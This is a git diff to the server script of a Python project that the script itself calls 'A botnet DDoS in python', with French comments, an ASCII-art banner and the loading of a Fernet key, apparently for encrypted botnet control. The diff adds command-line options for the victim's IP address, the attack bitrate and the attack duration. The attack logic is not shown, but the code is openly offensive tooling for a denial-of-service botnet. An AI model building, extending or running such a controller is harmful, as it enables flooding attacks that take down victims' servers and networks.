@@ -1,4 +1,5 @@
 # Script serveur
+import argparse
 import socket
 from cryptography.fernet import Fernet
 
@@ -13,6 +14,14 @@ $$ |  $$ |$$ |  $$ | $$ |$$\ $$ |  $$ |$$   ____| $$ |$$\       $$ |  $$ |$$ |  
 $$$$$$$  |\$$$$$$  | \$$$$  |$$ |  $$ |\$$$$$$$\  \$$$$  |      \$$$$$$$ |\$$$$$$$ |\$$$$$$  |$$$$$$$  |
 \_______/  \______/   \____/ \__|  \__| \_______|  \____/        \_______| \_______| \______/ \_______/
 """)
+
+parser = argparse.ArgumentParser(prog="botnet DDoS", description="A botnet DDoS in python")
+
+parser.add_argument("ip_address", type=str, help="The IP address of the victim")
+parser.add_argument("-b", "--bitrate", type=int, help="The bitrate for the attack in MB/s", action="store")
+parser.add_argument("-t", "--time", type=int, help="The length of the attack in second", action="store")
+
+args = parser.parse_args() # Access args with args.ip_address, args.bitrate, args.time
 
 #Récupération de la clé symétrique
 with open("secret.key", "rb") as key_file:
